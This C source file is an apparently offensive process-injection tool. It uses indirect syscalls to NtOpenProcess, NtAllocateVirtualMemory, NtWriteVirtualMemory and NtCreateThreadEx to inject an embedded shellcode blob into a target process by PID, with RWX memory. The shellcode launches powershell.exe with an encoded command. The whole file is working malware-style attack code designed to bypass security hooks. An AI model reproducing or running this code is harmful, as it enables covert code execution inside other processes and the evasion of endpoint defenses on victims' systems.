#include "injection.h"

#pragma section(".text")

__declspec(allocate(".text")) UCHAR shell[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c\x57\x69\x6e\x64\x6f\x77\x73\x50\x6f\x77\x65\x72\x53\x68\x65\x6c\x6c\x5c\x76\x31\x2e\x30\x5c\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65\x20\x2d\x65\x6e\x63\x20\x63\x41\x42\x76\x41\x48\x63\x41\x5a\x51\x42\x79\x41\x48\x4d\x41\x61\x41\x42\x6c\x41\x47\x77\x41\x62\x41\x41\x67\x41\x43\x30\x41\x5a\x51\x42\x75\x41\x47\x4d\x41\x49\x41\x42\x52\x41\x48\x63\x41\x51\x51\x41\x32\x41\x45\x45\x41\x52\x67\x42\x33\x41\x45\x45\x41\x56\x67\x42\x33\x41\x45\x49\x41\x63\x41\x42\x42\x41\x45\x63\x41\x4e\x41\x42\x42\x41\x46\x6f\x41\x51\x51\x42\x43\x41\x48\x59\x41\x51\x51\x42\x49\x41\x47\x4d\x41\x51\x51\x42\x6a\x41\x48\x63\x41\x51\x67\x42\x6a\x41\x45\x45\x41\x52\x67\x42\x4e\x41\x45\x45\x41\x5a\x51\x42\x52\x41\x45\x49\x41\x65\x67\x42\x42\x41\x45\x67\x41\x55\x51\x42\x42\x41\x46\x6f\x41\x55\x51\x42\x43\x41\x48\x51\x41\x51\x51\x42\x45\x41\x45\x30\x41\x51\x51\x42\x4e\x41\x47\x63\x41\x51\x67\x42\x6a\x41\x45\x45\x41\x52\x67\x42\x6a\x41\x45\x45\x41\x59\x51\x42\x52\x41\x45\x49\x41\x64\x51\x42\x42\x41\x45\x63\x41\x55\x51\x42\x42\x41\x47\x49\x41\x64\x77\x42\x43\x41\x44\x4d\x41\x51\x51\x42\x49\x41\x45\x30\x41\x51\x51\x42\x56\x41\x45\x45\x41\x51\x67\x42\x32\x41\x45\x45\x41\x53\x41\x42\x6a\x41\x45\x45\x41\x57\x67\x42\x52\x41\x45\x49\x41\x65\x51\x42\x42\x41\x45\x59\x41\x54\x51\x42\x42\x41\x47\x45\x41\x51\x51\x42\x43\x41\x47\x77\x41\x51\x51\x42\x48\x41\x48\x63\x41\x51\x51\x42\x69\x41\x45\x45\x41\x51\x67\x42\x6a\x41\x45\x45\x41\x53\x41\x42\x5a\x41\x45\x45\x41\x54\x51\x42\x52\x41\x45\x45\x41\x64\x51\x42\x42\x41\x45\x51\x41\x51\x51\x42\x42\x41\x46\x67\x41\x51\x51\x42\x43\x41\x48\x63\x41\x51\x51\x42\x48\x41\x44\x67\x41\x51\x51\x42\x6b\x41\x48\x63\x41\x51\x67\x42\x73\x41\x45\x45\x41\x53\x41\x42\x4a\x41\x45\x45\x41\x59\x77\x42\x33\x41\x45\x49\x41\x62\x77\x42\x42\x41\x45\x63\x41\x56\x51\x42\x42\x41\x47\x49\x41\x51\x51\x42\x43\x41\x48\x4d\x41\x51\x51\x42\x44\x41\x44\x51\x41\x51\x51\x42\x61\x41\x46\x45\x41\x51\x67\x41\x30\x41\x45\x45\x41\x52\x77\x42\x56\x41\x45\x45\x41\x53\x51\x42\x42\x41\x45\x49\x41\x56\x41\x42\x42\x41\x45\x67\x41\x55\x51\x42\x42\x41\x46\x6b\x41\x55\x51\x42\x43\x41\x48\x6b\x41\x51\x51\x42\x49\x41\x46\x45\x41\x51\x51\x42\x4d\x41\x46\x45\x41\x51\x67\x42\x52\x41\x45\x45\x41\x53\x41\x42\x4a\x41\x45\x45\x41\x59\x67\x42\x33\x41\x45\x49\x41\x61\x67\x42\x42\x41\x45\x63\x41\x56\x51\x42\x42\x41\x47\x4d\x41\x64\x77\x42\x43\x41\x48\x6f\x41\x51\x51\x42\x44\x41\x45\x45\x41\x51\x51\x42\x69\x41\x47\x63\x41\x51\x67\x42\x32\x41\x45\x45\x41\x53\x41\x42\x52\x41\x45\x45\x41\x57\x67\x42\x52\x41\x45\x49\x41\x64\x77\x42\x42\x41\x45\x63\x41\x52\x51\x42\x42\x41\x46\x6f\x41\x51\x51\x42\x42\x41\x44\x30\x41\x00";

int IndirectSyscall(DWORD pid, PBYTE shell, SIZE_T shell_size);

int main(int argc, char* argv[]) {
    PVOID buffer = NULL;

    if (argc < 2) {
        warn("usage: \"%s\" [PID]", argv[0]);
        return EXIT_FAILURE;
    }

    if (!IndirectSyscall(
        atoi(argv[1]),
        shell,
        sizeof(shell)
    )) {
        warn("[IndirectSyscall] failed");
        return EXIT_FAILURE;
    }

    okay("successfully injected into the payload with indirect syscalls!");

    return EXIT_SUCCESS;
}

int IndirectSyscall(DWORD pid, PBYTE shell, SIZE_T shell_size) {
    HANDLE hProcess, hThread = NULL;
    long status = 0;
    void* rbuffer = NULL;
    size_t bytes_written = 0;

    UINT_PTR pNtOpenProcess = (UINT_PTR)GetFunctionAddress("NTDLL", "NtOpenProcess");
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetFunctionAddress("NTDLL", "NtAllocateVirtualMemory");
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetFunctionAddress("NTDLL", "NtWriteVirtualMemory");
    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetFunctionAddress("NTDLL", "NtCreateThreadEx");
    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetFunctionAddress("NTDLL", "NtWaitForSingleObject");
    UINT_PTR pNtClose = (UINT_PTR)GetFunctionAddress("NTDLL", "NtClose");

    OBJECT_ATTRIBUTES OA = { sizeof(OBJECT_ATTRIBUTES) , NULL };
    CLIENT_ID CID = { (HANDLE)pid, NULL };

    //now we need to get the address of the system service number (SSN)
    wNtOpenProcess = ((PBYTE)(pNtOpenProcess + 4))[0];
    wNtAllocateVirtualMemory = ((PBYTE)(pNtAllocateVirtualMemory + 4))[0];
    wNtWriteVirtualMemory = ((PBYTE)(pNtWriteVirtualMemory + 4))[0];
    wNtCreateThreadEx = ((PBYTE)(pNtCreateThreadEx + 4))[0];
    wNtWaitForSingleObject = ((PBYTE)(pNtWaitForSingleObject + 4))[0];
    wNtClose = ((PBYTE)(pNtClose + 4))[0];

    //here we grab the address of the system call
    sysAddrNtOpenProcess = pNtOpenProcess + 0x12;
    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
    sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
    sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
    sysAddrNtClose = pNtClose + 0x12;

    //now we can actually use the functions provided to us
    info("getting a handle for process with PID [%ld]", pid);
    status = NtOpenProcess(
        &hProcess,
        PROCESS_ALL_ACCESS,
        &OA,
        &CID
    );
    if (status != STATUS_SUCCESS) {
        warn("[NtOpenProcess] failed with status: %lx", status);
        return 0;
    }
    okay("[0x%p] got a handle on the process (%ld)", hProcess, pid);

    info("attempting to allocate virtual memory");
    status = NtAllocateVirtualMemory(
        hProcess,
        &rbuffer,
        0,
        &shell_size,
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_EXECUTE_READWRITE
    );
    if (status != STATUS_SUCCESS) {
        warn("[NtAllocateVirtualMemory] failed with status: %lx", status);
        NtClose(hProcess);
        return 0;
    }
    okay("[0x%p] [RWX] allocate a %zu-byte buffer with PAGE_EXECUTE_READWRITE permissions", rbuffer, shell_size);

    info("writing to process [%ld] memory with buffer size of %zu-bytes", pid, shell_size);
    status = NtWriteVirtualMemory(
        hProcess,
        rbuffer,
        shell,
        shell_size,
        &bytes_written
    );
    if (status != STATUS_SUCCESS) {
        warn("[NtWriteVirtualMemory] failed with status: %lx", status);
        NtClose(hProcess);
        return 0;
    }
    okay("wrote to process (%ld) with size %zu-bytes", pid, shell_size);

    info("creating a thread");
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        &OA,
        hProcess,
        rbuffer,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );
    if (status != STATUS_SUCCESS) {
        warn("[NtCreateThreadEx] failed with status: %lx", status);
        NtClose(hProcess);
        return 0;
    }
    okay("[0x%p] successfully got a thread, waiting for it to finish execution..", hThread);

    status = NtWaitForSingleObject(
        hThread,
        FALSE,
        NULL
    );
    if (status != STATUS_SUCCESS) {
        warn("[NtWaitForSingleObject] failed with status: %lx", status);
        NtClose(hThread);
        NtClose(hProcess);
        return 0;
    }
    okay("[0x%p] thread finished execution!", hThread);

    NtClose(hThread);
    NtClose(hProcess);

    return 1;
}